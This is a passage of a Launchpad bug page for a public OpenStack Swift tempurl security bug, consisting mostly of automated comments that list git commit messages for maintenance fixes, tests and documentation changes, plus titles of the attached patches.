were applied to swift-dispersion-populate and swift-dispersion-report.
Relevant man pages, the example dispersion.conf and the admin guide were
updated accordingly.
DocImpact
Closes-Bug: #1468374
Change-Id: I0e716f8d281b4d0f510bc568bcee4a13fc480ff7
commit 3d9b2d077a157279fb6cd107a0c83727106af3ef
Author: Daisuke Morita <morita.daisuke@lab.ntt.co.jp>
Date: Fri Jul 24 10:42:10 2015 +0900
Fix swift-object-info to show policy index at deep working directory
If swift-object-info command is executed at deeper working directory
than 'objects-\*' directory, it cannot parse policy index from file path
so it does not show appropriate policy index. This patch fixes this
problem by simply extracting the full path of a target object file.
Change-Id: Idb734106a44b6121119c9b1dc8cdaaf4c6c28c31
Closes-Bug: 1469951
commit e24d7c36fa9758618ef88ed1a8e19f4d7bb0404f
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon May 25 18:26:38 2015 +0200
Use six to fix imports on Python 3
Get configparser, queue, http\_client modules from six.moves.
Patch generated by the six\_moves operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: I666241ab50101b8cc6f992dd80134ce27327bd7d
commit 964869accce8836bd2587c4b07559fb05fe580b2
Author: Atsushi SAKAI <sakaia@jp.fujitsu.com>
Date: Fri Jul 24 17:09:48 2015 +0900
Fix six typos on swift documentation
mechanisim => mechanism
http://docs.openstack.org/developer/swift/cors.html
overridde => override
http://docs.openstack.org/developer/swift/deployment\_guide.html
extentsions => extensions
http://docs.openstack.org/developer/swift/development\_ondisk\_backends.html
reuqest => request
http://docs.openstack.org/developer/swift/logs.html
suport => support
http://docs.openstack.org/developer/swift/overview\_architecture.html
mininum => minimum
http://docs.openstack.org/developer/swift/overview\_erasure\_code.html
$ git diff | diffstat
cors.rst | 2 +-
deployment\_guide.rst | 2 +-
development\_ondisk\_backends.rst | 2 +-
logs.rst | 2 +-
overview\_architecture.rst | 2 +-
overview\_erasure\_code.rst | 2 +-
6 files changed, 6 insertions(+), 6 deletions(-)
Change-Id: I8e095f4c216b2cfae48dff1e17d387048349f73c
Closes-Bug: #1477877
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit 89f705e8aab144092d40a13fc4ef19ffef5f3eba
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Thu Jul 23 06:11:27 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I94cf347564cb33977f33b1e64259bcb39a8cf809
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit f563a423bf2534268c2e785094d58dbbe0ebd390
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Wed Jul 22 15:27:26 2015 -0400
Updated tox setup instructions on Development Guidelines
The instructions suggest updating the ownership of the swift.egg-info
directory may be required and provide a cmd to do so. Said cmd assumes user
'swift' exists, but tox will require the current user to have access to the
directory to perform updates, moreover user swift may not exist at all.
Change-Id: I63951970553c086ff4f1ac65a81559ba69166494
commit a65e9db8752793ec37b594dc9eca5066171825db
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Jul 22 10:43:17 2015 +0000
Removing commented out code in test/unit/account/test\_backend.py
Noticed this while reviewing another change. Looks like the test itself already
ensures correct functionality of the reclaim() method in AccountBroker without
the commented code, thus removing this stale code.
Change-Id: I6a26a7591adef9fd794ca68a4e9c493d1127f93c
commit 99d052772a9585e0befdfd292fd03aefde77180a
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 13 01:12:43 2015 -0700
Fix 499 client disconnected on COPY EC object
Currently, a COPY request for an EC object might go to fail as 499 Client
disconnected because of the difference between destination request content
length and actual transferred bytes.
That is because the conditional response status and content length for
an EC object range GET is handled at calling the response instance on
proxy server. Therefore the calling response instance (resp()) will change
the conditional status from 200 (HTTP\_OK) to 206 (PartialContent) and will
change the content length for the range GET.
In EC case, sometimes Swift needs whole stored contents to decode a segment.
It will make 200 HTTP OK response from object-server and proxy-server
will unfortunately set whole content length to the destination content
length and it makes the bug 1467677.
This patch introduces a new method "fix\_conditional\_response" for
swift.common.swob.Response that calling \_response\_iter() and cached the
iter in the Response instance. By calling it, Swift can set correct condtional
response any time after setting whole content\_length to the response
instance like EC case.
Change-Id: If85826243f955d2f03c6ad395215c73daab509b1
Closes-Bug: #1467677
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit 62ed4f81ef80440550633eaaaa962a4f9383c2d3
Author: Timur Alperovich <timur.alperovich@gmail.com>
Date: Tue Jul 14 16:56:44 2015 -0700
Add two functional tests for delimiter.
The first test verifies that a delimiter will trim entries beyond the
first matching instance of delimiter (after the given matching prefix,
if any) and squash duplicates. So, when setting the delimiter
to "-", given blobs "test", "test-foo" and "test-bar-baz", we expect
only "test" (no matching delim) and "test-" (trim all characters after
the first "-", and squash duplicates).
The second test verifies that when a prefix is provided, the delimiter
will trim entries beyond the first matching instance of the delimiter
\*after the given prefix\*. So "bar, "bazar" which both match the
prefix "ba" will be returned as "bar" (no delimiter after the matching
prefix) and "baza" (after matching the prefix the remainder after the
the \*next\* matching delimiter "a" is trimmed).
Change-Id: I49a2aa8722f83e87b7d211e5c26827e93963d92a
commit 2d6c5fe2afde382edb8f04c91fca1911601b61d9
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 21 09:56:13 2015 -0700
Fix Associated Projects link on Getting Started
Change-Id: I50be656bc5868242489f97c96a1feaef171933e0
commit cd7b2db550e41412281da0256b468c90ebcf3e8b
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 19:23:00 2015 +0530
unit tests: Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
This patch makes sure that running the tests does not create undesired
warnings.
Change-Id: I0602ba39ef93263386644ee68088d5f65fcb4a71
commit c3cc98b2c918476f1b54924e0c54e4c746eba4ac
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 17:03:20 2015 -0700
Add comment about ResumingGetter.used\_source\_etag
This confused a couple developers and took about ten minutes to
unravel in IRC; let's leave a clue for the next person.
Change-Id: I356c8c7a44de23f02eaf68d23a39c9eb4c203ff1
commit 06326d74657a8796439988115002298e4a5f4630
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 20 21:41:58 2015 +0530
Metaclass Python 3.x Compatibility
use "six.add\_metaclass" instead of "\_\_metaclass\_\_"
Change-Id: I57390fec40afe3a965be3215db8f79b9cf862a70
commit 317fa1af49d72ecaf7a9a499d8cdf00a086b4c6f
Author: Azhagu Selvan SP <tamizhgeek@gmail.com>
Date: Sat Jul 18 14:37:16 2015 +0530
Minor change in development saio setup doc
Make the test-requirements install command uniform with the rest of the
setup commands in the page by using the $HOME, instead of hardcoding
the folder path.
Change-Id: I8da7a191a301601e27f894f8268238d77b150ede
commit 39621b8629c7f378fc197f6ab1ddc8e2e797d1fa
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 18 14:12:58 2015 +0530
Deprecated xreadlines() usage fixed
Change-Id: Iadf42c2f86f78c11259e21c88b4aef51db3441ad
commit dde34c4b442a27761f2e6eca46ed9ec47a110392
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 11 22:46:41 2015 +0530
Modify zip usage for python3 where necessary.
py2 zip() is eager but py3 zip() and six.moves.zip() are lazy,
changing ones that require eager evaluation.
Change-Id: Ic9f6bccd7f57772158581905794f8d23b05f4223
commit faff98efd47fd59e28b1adb3e7ad4bc3dc6dd781
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Jul 9 07:35:47 2015 +0530
Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I9d9ca5766a2773a7b4071e280f00361d16b85383
commit 8753e452b04b0af6d6b444184b628724e14fbbb1
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 18:01:37 2015 +0200
Replace StringIO with BytesIO for WSGI input
wsgi.input is a binary stream (bytes), not a text stream (unicode).
\* Replace StringIO with BytesIO for WSGI input
\* Replace StringIO('') with StringIO() and replace WsgiStringIO('') with
WsgiStringIO(): an empty string is already the default value
Change-Id: I09c9527be2265a6847189aeeb74a17261ddc781a
commit 6e70f3fa322da70c2a65fb919d200e52fc5add8a
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 17:27:47 2015 +0200
Get StringIO and cStringIO from six.moves
\* replace "from cStringIO import StringIO"
with "from six.moves import cStringIO as StringIO"
\* replace "from StringIO import StringIO"
with "from six import StringIO"
\* replace "import cStringIO" and "cStringIO.StringIO()"
with "from six import moves" and "moves.cStringIO()"
\* replace "import StringIO" and "StringIO.StringIO()"
with "import six" and "six.StringIO()"
This patch was generated by the stringio operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: Iacba77fec3045f96773d1090c0bd48613729a561
commit c366ecf5c85c2797582bf79f7faab1d75b99a70e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 13 00:07:13 2015 +0530
Fix a minor python issue related with string.split
Replacing string.split(value, ',') with value.split(','):
the string.split() function was removed in Python 3
Change-Id: I9ed241a894ac698da33df75a774a56ae2824fadf
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47
commit 39b6ef6e4fd515d81e688ef365d26d5e0499be7c
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jun 25 02:06:54 2015 +0800
Fix reconstructor stats mssage.
Calculate reconstruction job count and remaining time that
would be inappropriate for user. Use real partition count would
be suitable for user.
Change-Id: I6b025854baf4757dddf9d7fe7bc2cece58a49157
Closes-Bug: #1468298
commit bfbda38db999ccd881509c68f0319c3d3dae4274
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 7 15:13:20 2015 -0700
Add save command to ring-builder-analyzer
\* cleanup command => ring builder function mapping
\* cleanup ParseCommandError/ValueError message building
Change-Id: I4be2aa963ce4f43035f02371d8388abd7a76536c
commit c907107fe4eacb378a92799de915234bd72d5d7c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 7 22:46:37 2015 +0530
cPickle is deprecated in py3, replacing it from six.moves
cPickle is deprecated and should be replaced with six.moves
to provide py2 and py3 compatibility.
Change-Id: Ibad990708722360d188c641e61444d50a16a1e93
commit 86033ba4dcd7b86670306b6e66345ae464caca9d
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jun 30 18:56:23 2015 +0100
EC tests should use ECDiskFileManager
Some EC tests in proxy/test\_server.py use the replication
DiskFileManager to open diskfiles. That works because it
turns out that DiskFileManager is robust to the frag index
being stitched onto the end of the timestamp in filenames,
but it would be better to test using the ECDiskFileManager
for EC diskfiles.
Also, drive-by deletion of some duplicated lines.
Change-Id: Ie3adb607d8c34a469df7d0f6f542ed5ba9a2dac0
commit 7bdb8266d4b926526acdea22e8c9c634855eeecc
Author: Thiago da Silva <thiago@redhat.com>
Date: Wed Mar 25 13:19:36 2015 +0000
Select policy when running functional test
Add ability to select a storage policy when running
the functional tests by defining the environment variable
SWIFT\_TEST\_POLICY.
This patch was first introduced by Janie Richling in
feature/ec: https://review.openstack.org/#/c/166097
Co-Authored-By: Janie Richling <jrichli@us.ibm.com>
Co-Authored-By: Christian Schwede <christian.schwede@enovance.com>
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Change-Id: Id96354546088df137def0ae7fd434baf64ed0c51
Signed-off-by: Thiago da Silva <thiago@redhat.com>

| **tags**: | added: in-feature-hummingbird |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-21:  [**Related fix proposed to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/37) |  |  | [#37](/swift/%2Bbug/1453948/comments/37) |
| --- | --- | --- | --- |

Related fix proposed to branch: feature/crypto

Review: <https://review.openstack.org/225540>

Related fix proposed to branch: feature/crypto
Review: https://review.openstack.org/225540

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-21:  [**Change abandoned on swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/38) |  |  | [#38](/swift/%2Bbug/1453948/comments/38) |
| --- | --- | --- | --- |

Change abandoned by John Dickinson (<email address hidden>) on branch: feature/crypto

Review: <https://review.openstack.org/225540>

Reason: jrichli will do this

Change abandoned by John Dickinson (me@not.mn) on branch: feature/crypto
Review: https://review.openstack.org/225540
Reason: jrichli will do this

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-21:  [**Related fix merged to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/39) |  |  | [#39](/swift/%2Bbug/1453948/comments/39) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1453948/comments/39/%2Bdownload) (12.2 KiB)

Reviewed: <https://review.openstack.org/225540>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=1936299943116abcedd8b36fb8b64c724e539ab7>

Submitter: Jenkins

Branch: feature/crypto

commit 9e95613d717489da584531e220db20d1b8f43c51

Author: Alistair Coles <email address hidden>

Date: Mon Sep 21 10:01:54 2015 +0100

Fix .coveragrc to prevent nose tests error

Since v4.0 the coverage package raises an error if unrecognized

    options are found in .coveragrc [1]. Previously they were ignored. The

    ignore-errors option therefore causes nosetests with coverage to error

    because the option should be ignore\_errors (underscore not hyphen).

[1] <https://bitbucket.org/ned/coveragepy/src/tip/CHANGES.rst>

Change-Id: Ic488801b7cc43217f9e2a4ed945e06505b667608

commit 1fe8e4327b15f8933efef185d09b6067d1f28716

Author: Clay Gerrard <email address hidden>

Date: Fri Sep 18 13:54:52 2015 -0700

Fix recon tests on SAIO with multiple policies

Recon middleware used to only look on rings that exist on disk when it was

    started, so if a test didn't create a ring in the temp swift\_dir it can expect

    the middleware to not report it.

However, after we started looking at policies to determine rings [1] - we need

    to be more careful to patch policies to match up with the test requirements.

    On development environments with only the legacy default polices the existing

    recon tests were passing by accident - but not in my environment.

This change will patch policies for the TestCase so that tests will pass for

    me. Individual test methods that have more specific policy requirements for

    the test can continue to @patch\_policies just for those tests but in general

    the existing test\_methods all seem to expect legacy policies - so we just make

    the default for the TestCase legacy\_only.

Change-Id: I778a0a59091ca8870e1cab985f3ec426eb045ab7

commit a63f70c17d392379ec75045a94c38a96878b4c5c

Author: Minwoo Bae <email address hidden>

Date: Wed Sep 9 15:33:45 2015 -0500

Reconstructor logging to omit 404 warnings

Currently, the replicator does not log warning messages

    for 404 responses. We would like the reconstructor to

    do the same, as 404s are not considered unusual, and

    are already handled by the object server.

Change-Id: Ia927bf30362548832e9f451923ff94053e11b758

    Closes-Bug: #1491883

commit 530102ae07ea27b4a994e4b1fb2f590700cfef0c

Author: Bill Huber <email address hidden>

Date: Mon Sep 14 16:01:39 2015 -0500

Update EC Support on how to build an EC ring with replicas count

This doc is being updated to specify the replicas count parameter

    to build an EC ring that enforces both data and parity placements

    for each partition.

Change-Id: I770ad268e4017e610be3357e89b89f0b7d3c18af

    Closes-Bug: 1487203

commit 0d9142abd45f189b15eaec1a25464ed7d1859f97

Author: Clay Gerrard <email address hidden>

Date: Mon Sep 14 17:17:29 2015 -0700

Fix typo in Deployment Guide and add some formatting

Change-Id: I58703162bf3e9f39656a5e511bd8fe845793bca2

commit 460a7e4b64d134d1fd47f09924d594196b6...

Reviewed: https://review.openstack.org/225540
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=1936299943116abcedd8b36fb8b64c724e539ab7
Submitter: Jenkins
Branch: feature/crypto
commit 9e95613d717489da584531e220db20d1b8f43c51
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Sep 21 10:01:54 2015 +0100
Fix .coveragrc to prevent nose tests error
Since v4.0 the coverage package raises an error if unrecognized
options are found in .coveragrc [1]. Previously they were ignored. The
ignore-errors option therefore causes nosetests with coverage to error
because the option should be ignore\_errors (underscore not hyphen).
[1] https://bitbucket.org/ned/coveragepy/src/tip/CHANGES.rst
Change-Id: Ic488801b7cc43217f9e2a4ed945e06505b667608
commit 1fe8e4327b15f8933efef185d09b6067d1f28716
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Sep 18 13:54:52 2015 -0700
Fix recon tests on SAIO with multiple policies
Recon middleware used to only look on rings that exist on disk when it was
started, so if a test didn't create a ring in the temp swift\_dir it can expect
the middleware to not report it.
However, after we started looking at policies to determine rings [1] - we need
to be more careful to patch policies to match up with the test requirements.
On development environments with only the legacy default polices the existing
recon tests were passing by accident - but not in my environment.
This change will patch policies for the TestCase so that tests will pass for
me. Individual test methods that have more specific policy requirements for
the test can continue to @patch\_policies just for those tests but in general
the existing test\_methods all seem to expect legacy policies - so we just make
the default for the TestCase legacy\_only.
Change-Id: I778a0a59091ca8870e1cab985f3ec426eb045ab7
commit a63f70c17d392379ec75045a94c38a96878b4c5c
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Wed Sep 9 15:33:45 2015 -0500
Reconstructor logging to omit 404 warnings
Currently, the replicator does not log warning messages
for 404 responses. We would like the reconstructor to
do the same, as 404s are not considered unusual, and
are already handled by the object server.
Change-Id: Ia927bf30362548832e9f451923ff94053e11b758
Closes-Bug: #1491883
commit 530102ae07ea27b4a994e4b1fb2f590700cfef0c
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Sep 14 16:01:39 2015 -0500
Update EC Support on how to build an EC ring with replicas count
This doc is being updated to specify the replicas count parameter
to build an EC ring that enforces both data and parity placements
for each partition.
Change-Id: I770ad268e4017e610be3357e89b89f0b7d3c18af
Closes-Bug: 1487203
commit 0d9142abd45f189b15eaec1a25464ed7d1859f97
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Sep 14 17:17:29 2015 -0700
Fix typo in Deployment Guide and add some formatting
Change-Id: I58703162bf3e9f39656a5e511bd8fe845793bca2
commit 460a7e4b64d134d1fd47f09924d594196b6458d4
Author: Brian Cline <bcline@softlayer.com>
Date: Wed Sep 2 04:13:29 2015 -0500
Fixes recon bug with initially missing rings
Previously the recon middleware was doing a basic scan for object
rings that exist at init time. In situations where an object-server
was started without an object ring present, but received one shortly
after, recon still would not report it in the /recon/ringmd5 response.
This persists even when object-server gleefully chugs along after
picking up the ring, and recon's behavior would only be corrected by
an object-server reload/restart.
This change brings the middleware a bit more up to date to use the
common POLICIES instance to determine what policies were already loaded
based on configuration, and derives the path for each ring.
This effectively makes the config the source of truth for what rings
\*should\* be present, rather than what's present at startup. Since we
already dynamically check in ReconMiddleware.get\_ring\_md5 whether each
of the predetermined ring files exist, recon now correctly reports a
previously-missing ring whenever it falls into place.
Change-Id: Ia079418e54ffac5e01ef6a15511f5069b7fe83ea
commit 9324ce83c6dcbf5fb4ffefdc781eec5db1b946c9
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Tue Sep 8 16:11:33 2015 -0500
Reconstructor GET excludes user\_agent in log
To make it easier for users to deduce in the log to find out
where the request originates from, it is necessary to include
the user\_agent field in the reconstructor for a GET method
and to have this particular log consistent with other servers'
methods.
Change-Id: I0ca7443436e97c2db64c966ab4d73c5c12a1f059
Closes-Bug: 1491871
Co-Authored-By: Kota Tsuyuzakai <tsuyuzaki.kota@lab.ntt.co.jp>
commit 369447ec47dc8df3e38046a305cf1aa0a6499ce9
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 15:09:29 2015 -0700
Fix purge for tombstone only REVERT job
When we revert a partition we normally push it off to the specific
primary node for the index of the data files in the partition. However,
when a partition is devoid of any data files (only tombstones) we build
a REVERT job with a frag\_index of None.
This change updates the ECDiskFile's purge method to be robust to
purging tombstones when the frag\_index is None.
Add probetest to validate tombstone only revert jobs will clean
themselves up if they can validate they're in-sync with part-replica
count nodes - even if one of the primaries is down (in which case they
sync tombstones with other handoffs to fill in for the primaries)
Change-Id: Ib9a42f412fb90d51959efce886c0f8952aba8d85
commit a3facce53cac0497edb326a93a97f24e02c603ab
Author: paul luse <paul.e.luse@intel.com>
Date: Thu Aug 27 11:02:27 2015 -0700
Fix invalid frag\_index header in ssync\_sender when reverting EC tombstones
Back in d124ce [1] we failed to recognize the situation where a revert
job would have an explicit frag\_index key wth the literal value None
which would take precedence over the dict.get's default value of ''.
Later in ssync\_receiver we'd bump into the ValueError converting 'None'
to an int (again).
In ssync\_sender we now handle literal None's correctly and should
hopefully no longer put this invalid headers on the wire - but for belts
and braces we'll also update ssync\_receiver to raise a 400 series error
and ssync\_sender to better log the error messages.
1. https://review.openstack.org/#/c/195457/
Co-Author: Clay Gerrard <clay.gerrard@gmail.com>
Co-Author: Alistair Coles <alistair.coles@hp.com>
Change-Id: Ic71ba7cc82487773214030207bb193f425319449
Closes-Bug: 1489546
commit 71f6fd025ea013bc457450a5cc4f8e92c6df92cc
Author: Romain LE DISEZ <romain.ledisez@ovh.net>
Date: Tue Jun 16 12:47:26 2015 +0200
Allows to configure the rsync modules where the replicators will send data
Currently, the rsync module where the replicators send data is static. It
forbids administrators to set rsync configuration based on their current
deployment or needs.
As an example, the rsyncd configuration example encourages to set a connections
limit for the modules account, container and object. It permits to protect
devices from excessives parallels connections, because it would impact
performances.
On a server with many devices, it is tempting to increase this number
proportionally, but nothing guarantees that the distribution of the connections
will be balanced. In the worst scenario, a single device can receive all the
connections, which is a severe impact on performances.
This commit adds a new option named 'rsync\_module' to the \*-replicator sections
of the \*-server configuration file. This configuration variable can be
extrapolated with device attributes like ip, port, device, zone, ... by using
the format {NAME}. eg:
rsync\_module = {replication\_ip}::object\_{device}
With this configuration, an administrators can solve the problem of connections
distribution by creating one module per device in rsyncd configuration.
The default values are backward compatible:
{replication\_ip}::account
{replication\_ip}::container
{replication\_ip}::object
Option vm\_test\_mode is deprecated by this commit, but backward compatibility is
maintained. The option is only effective when rsync\_module is not set. In that
case, {replication\_port} is appended to the default value of rsync\_module.
Change-Id: Iad91df50dadbe96c921181797799b4444323ce2e
commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Sat Sep 5 06:17:51 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6
commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer <speer.emett@gmail.com>
Date: Wed Sep 2 17:18:03 2015 -0700
[Labs] Update links to Cloud Admin Guide
Update links to the Cloud Admin Guide after the
RST conversion of that book altered URLs.
Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b
commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Sep 2 10:52:34 2015 +0000
Test if container\_sweep is executed on unmounted devices
This change ensures that container\_sweep is not run if a device is not mounted
and mount\_check is set to True.
Change-Id: I823083c8431d9e61fd426508033ec9188503957b
commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline <bcline@softlayer.com>
Date: Tue Sep 1 10:51:20 2015 -0500
Adds useful dispersion info from changelog
Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e
commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Aug 2 21:29:13 2015 +0530
Replace a / b with a // b to use integer division where needed
Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948
commit 4765189ef3f67b3f709c3141f222e15c6d89a62d
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Thu Jul 9 23:10:05 2015 -0400
Improving statistics sent to Graphite.
Currently, statistics are organized by command. However, it would also be
useful to display statistics organized by policy. Different policies may be
based on different storage properties (ie, faster disks).
With this change, all the statistics for object timers will be sent per policy
as well.
Policy statistics reporting will use policy index and the name in Graphite will
show as proxy-server.object.policy.<policy-index>.<verb>, etc.
Updated unit tests for per-policy stat reporting and added new unit tests for
invalid cases.
Updated documentation in the Administrator's Guide to reflect this new
aggregation.
Change-Id: Id70491e4833791a3fb8ff385953d69018514cd9c
commit 5b01c5eadc3a13607d2581a55007700fca0b00af
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Fri Aug 7 16:24:28 2015 -0500
Add unit test for container\_update for unmounted device
This unit test case gains coverage for container/update.py
where a device (i.e. sda1) is not mounted and the code
responds with a warning logger that the device is not
mounted and continues. Coverage increases 2% as a result.
Change-Id: I33d247a930b28604093df4ade1ce7dbbd24aac54

[See full activity log](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/swift/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/swift/%2Bbug/1453948/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [400 PUT tempurls that have a x-object-manifest header](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4418957/%2Bfiles/fix-tempurl-dlo-surprise.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4418957 "Change patch details")
* [fix-tempurl-for-clayg.diff](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433373/%2Bfiles/fix-tempurl-for-clayg.diff)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433373 "Change patch details")
* [fix-patch-for-kota.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433396/%2Bfiles/fix-patch-for-kota.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433396 "Change patch details")
* [tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435635/%2Bfiles/tempurl.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435635 "Change patch details")
* [juno-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435840/%2Bfiles/juno-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435840 "Change patch details")
* [kilo-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435842/%2Bfiles/kilo-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435842 "Change patch details")

* [Add patch](/swift/%2Bbug/1453948/%2Baddcomment?field.patch=on)

## Bug attachments

* [show how to use any PUT tempurl to probe for object/container existance](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4395824/%2Bfiles/put-tempurl-dlo-leak.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4395824 "Change attachment details")
* [anc-tempurl-dlo-POST-regression](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439702/%2Bfiles/anc-tempurl-dlo-POST-regression)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439702 "Change attachment details")
* [anc-tempurl-dlo-POST-test](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439705/%2Bfiles/anc-tempurl-dlo-POST-test)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439705 "Change attachment details")

* [Add attachment](/swift/%2Bbug/1453948/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
